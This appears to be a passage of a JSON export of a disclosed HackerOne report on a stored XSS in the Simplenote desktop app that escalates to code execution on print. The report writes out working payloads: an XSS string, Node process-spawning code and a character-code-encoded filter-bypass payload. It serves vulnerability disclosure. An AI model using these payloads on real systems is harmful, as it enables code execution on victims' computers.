+            "message": "I tried to look at the source code, but I do not understand where the bug is. In [your fix](https://github.com/Automattic/simplenote-electron/commit/35c816eba4637282e0d0adddd696b3c3b142c69f) I read (*line 232-233*)\n ```\n+              dangerouslySetInnerHTML={{\n+                __html: renderNoteToHtml(content),\n ```\n\n**renderNoteToHtml** is in these two files: [here](https://github.com/Automattic/simplenote-electron/blob/master/lib/utils/render-note-to-html.js) and [here](https://github.com/Automattic/simplenote-electron/blob/master/lib/utils/sanitize-html.js).\n\nIn **sanitize-html.js** there is the code:\n ```\n      // only valid http(s) URLs are allowed\n      if (('href' === name || 'src' === name) && validUrl.isWebUri(value)) {\n        return false;\n      }\n ```\nSo **href=\"javascript:alert(1)\"** should not work. Indeed in the Preview it doesn't work, but it works in the print moment. Another strange thing: **href=\"javascript:alert(1)\"** runs, but **href=\"javascript:write(1)\"** does not seem to run.\n\nI'm curious to understand the problem in the code.\nThank you.", 
+            "markdown_message": "<p>I tried to look at the source code, but I do not understand where the bug is. In <a href=\"/redirect?signature=7e062a6c38d22896c5a3c0a34ec9891920137245&amp;url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fcommit%2F35c816eba4637282e0d0adddd696b3c3b142c69f\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>your fix</span><i class=\"icon-external-link\"></i></a> I read (<em>line 232-233</em>)</p>\n<pre class=\"highlight plaintext\"><code>+              dangerouslySetInnerHTML={{\n+                __html: renderNoteToHtml(content),\n</code></pre>\n<p><strong>renderNoteToHtml</strong> is in these two files: <a href=\"/redirect?signature=02979662e578ca4d50877f12e151f884acf690c9&amp;url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fblob%2Fmaster%2Flib%2Futils%2Frender-note-to-html.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>here</span><i class=\"icon-external-link\"></i></a> and <a href=\"/redirect?signature=1e4c838ee267b4f10a2a8abde65a1f9123cfb70e&amp;url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fblob%2Fmaster%2Flib%2Futils%2Fsanitize-html.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>here</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>In <strong>sanitize-html.js</strong> there is the code:</p>\n<pre class=\"highlight plaintext\"><code>      // only valid http(s) URLs are allowed\n      if ((&#39;href&#39; === name || &#39;src&#39; === name) &amp;&amp; validUrl.isWebUri(value)) {\n        return false;\n      }\n</code></pre>\n<p>So <strong>href=&quot;javascript:alert(1)&quot;</strong> should not work. Indeed in the Preview it doesn&#39;t work, but it works in the print moment. Another strange thing: <strong>href=&quot;javascript:alert(1)&quot;</strong> runs, but <strong>href=&quot;javascript:write(1)&quot;</strong> does not seem to run.</p>\n\n<p>I&#39;m curious to understand the problem in the code.<br>\nThank you.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2886822, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-18T11:45:32.368Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-18T11:45:32.368Z", 
+            "actor": {
+                "username": "luigigubello", 
+                "url": "/luigigubello", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/205/454/77a4edea649a95f13602ac78a5672e6af6ad1392_medium.jpeg?1519577439"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Hi @roundhill , \n\nDo you confirm the bug?\n\nBest regards", 
+            "markdown_message": "<p>Hi <a href=\"/roundhill\">@roundhill</a> , </p>\n\n<p>Do you confirm the bug?</p>\n\n<p>Best regards</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2900985, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-18T20:07:09.963Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-18T20:07:09.963Z", 
+            "actor": {
+                "username": "roundhill", 
+                "url": "/roundhill", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/062/41ebbb0fec998dcb14b225322befdad7d395eb33_medium.jpeg?1506457708"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Taking a look now, will get back to you soon.", 
+            "markdown_message": "<p>Taking a look now, will get back to you soon.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2902840, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-19T18:05:01.499Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-19T18:05:01.499Z", 
+            "actor": {
+                "username": "roundhill", 
+                "url": "/roundhill", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/062/41ebbb0fec998dcb14b225322befdad7d395eb33_medium.jpeg?1506457708"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "I've created a fix here, if you are curious about the details: https://github.com/Automattic/simplenote-electron/pull/771", 
+            "markdown_message": "<p>I&#39;ve created a fix here, if you are curious about the details: <a title=\"https://github.com/Automattic/simplenote-electron/pull/771\" href=\"/redirect?signature=73aa7113616329893b8cfd1ca6934c0c70f51e5b&amp;url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fpull%2F771\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/Automattic/simplenote-electron/pull/771</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2908291, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-20T11:43:57.700Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-20T11:44:36.671Z", 
+            "actor": {
+                "username": "luigigubello", 
+                "url": "/luigigubello", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/205/454/77a4edea649a95f13602ac78a5672e6af6ad1392_medium.jpeg?1519577439"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Good, thanks @roundhill :)\n\nWhen you want you can set the report like \"Resolved\"!", 
+            "markdown_message": "<p>Good, thanks <a href=\"/roundhill\">@roundhill</a> :)</p>\n\n<p>When you want you can set the report like &quot;Resolved&quot;!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2911516, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "luigigubello", 
+                "url": "/luigigubello"
+            }, 
+            "created_at": "2018-06-25T20:09:41.671Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-25T20:09:41.671Z", 
+            "actor": {
+                "username": "vortfu", 
+                "url": "/vortfu", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/982/b80411c54ee08b9579811d3427a54368f8d03d09_medium.png?1422255349"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2932597, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-06-25T20:10:27.188Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-25T20:10:27.188Z", 
+            "actor": {
+                "url": "/automattic", 
+                "profile": {
+                    "name": "Automattic"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
+                }
+            }, 
+            "team_handle": "automattic", 
+            "bonus_amount": "50.0", 
+            "bounty_amount": "200.0", 
+            "collaborator": {
+                "username": "luigigubello", 
+                "url": "/luigigubello"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2932599, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-26T08:26:03.270Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-26T08:26:03.270Z", 
+            "actor": {
+                "username": "luigigubello", 
+                "url": "/luigigubello", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/205/454/77a4edea649a95f13602ac78a5672e6af6ad1392_medium.jpeg?1519577439"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "first_to_agree": true, 
+            "message": "Thank you :) Can we do public disclosure?\n", 
+            "markdown_message": "<p>Thank you :) Can we do public disclosure?</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2934312, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-26T08:26:07.167Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-26T08:26:07.167Z", 
+            "actor": {
+                "url": "/automattic", 
+                "profile": {
+                    "name": "Automattic"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
+                }
+            }, 
+            "team_handle": "automattic", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3099974, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "luigigubello", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/luigigubello", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/205/454/a7f27da8bf40bb7b8caea9afd6bf1725545e534f_small.jpeg?1519577439"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 70, 
+        "name": "Code Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -11541162.677840272, 
+    "disclosed_at": "2018-07-26T08:26:07.139Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/358049", 
+    "created_at": "2018-05-27T09:33:36.011Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>In <strong>Simplenote 1.1.3 - Desktop app</strong> there is a stored XSS vulnerability that can be used to execute arbitrary code. If there is malicious code in the note and the user tries to print it (for example to save it as a PDF), the malicious code runs.</p>\n\n<p>This report is based on the <a href=\"https://hackerone.com/reports/291539\">report <strong>#291539</strong></a>, by Yasin Soliman (ysx). I used his code to pass from XSS to RCE.</p>\n\n<h1 id=\"step-to-reproduce\">Step to reproduce</h1>\n\n<h2 id=\"1-prerequisites\">1 - Prerequisites</h2>\n\n<ul>\n<li>Download and install Simplenote 1.1.3 Desktop app (I use Debian, but I think the problem is present on all desktop versions)</li>\n<li>Markdown must <strong>not</strong> be enabled</li>\n</ul>\n\n<h2 id=\"2-stored-xss\">2 - Stored XSS</h2>\n\n<p>Create a new note, and you write this text:</p>\n<pre class=\"highlight plaintext\"><code>&quot;&gt;&#39;&gt;&lt;details/open/ontoggle=confirm(&#39;XSS&#39;)&gt;\n</code></pre>\n<p>Now go to <strong>File</strong> --&gt; <strong>Print</strong>. An alert box appears, so there is a XSS vulnerability and the code runs when the user tries to print the note.</p>\n\n<h2 id=\"3-from-xss-to-rce\">3 - From XSS to RCE</h2>\n\n<p>Thanks to <a href=\"https://hackerone.com/ysx\"><strong>ysx</strong></a>, I used the code in his proof-of-concept.<br>\nThe code to open the Gnome calculator in Debian is:</p>\n<pre class=\"highlight plaintext\"><code>var Process = process.binding(&#39;process_wrap&#39;).Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+&#39;=&#39;+env[key]);\nproc.spawn({file:&#39;/usr/bin/gnome-calculator&#39;,cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:&#39;ignore&#39;},{type:&#39;ignore&#39;},{type:&#39;ignore&#39;}]});\n</code></pre>\n<p>Now you use the functions <code>writeln()</code> and <code>String.fromCharCode()</code> to bypass possible filters. So you <a href=\"/redirect?signature=b5ecf99fb3d04aecf5805bcf7802555d807a4a0a&amp;url=https%3A%2F%2Fwww.martineve.com%2F2007%2F05%2F15%2Fjavascript-eval-string-fromcharcode-encoder\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>encode</span><i class=\"icon-external-link\"></i></a> the script into unicode values. Now you can create the payload:</p>\n<pre class=\"highlight plaintext\"><code>&quot;&gt;&#39;&gt;&lt;img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))&gt;\n</code></pre>\n<p>You write it in a note, then you print it (or save like pdf). The Gnome calculator will open.</p>\n\n<p>I have attached two screenshots and a proof-of-concept video.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>An attacker can create a note with malicious code. Then he can share it with the victim, asking to print it or save it in pdf (it may be useful to have a pdf file) so the code is executed on the victim&#39;s computer.</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://automattic.com", 
+            "about": "WordPress.com, VaultPress, Akismet, Gravatar, Cloudup, WooCommerce, Polldaddy and more!", 
+            "twitter_handle": "", 
+            "name": "Automattic"
+        }, 
+        "handle": "automattic", 
+        "url": "https://hackerone.com/automattic", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/111/6b5147b71079b286c99869a85682f609f6c617c6_small.png?1396031864", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 111, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
